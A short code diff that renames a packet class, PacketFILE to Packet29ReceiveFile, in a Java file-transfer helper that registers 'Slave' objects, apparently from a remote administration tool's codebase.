@@ -4,7 +4,7 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
 
-import com.redpois0n.packets.incoming.PacketFILE;
+import com.redpois0n.packets.incoming.Packet29ReceiveFile;
 
 
 public class FileData {
@@ -13,7 +13,7 @@ public class FileData {
 	private List<String> remoteFiles = new ArrayList<String>();
 	
 	public FileData(Slave slave) {
-		PacketFILE.data.put(slave, this);
+		Packet29ReceiveFile.data.put(slave, this);
 	}
 	
 	public File getLocalFile() {
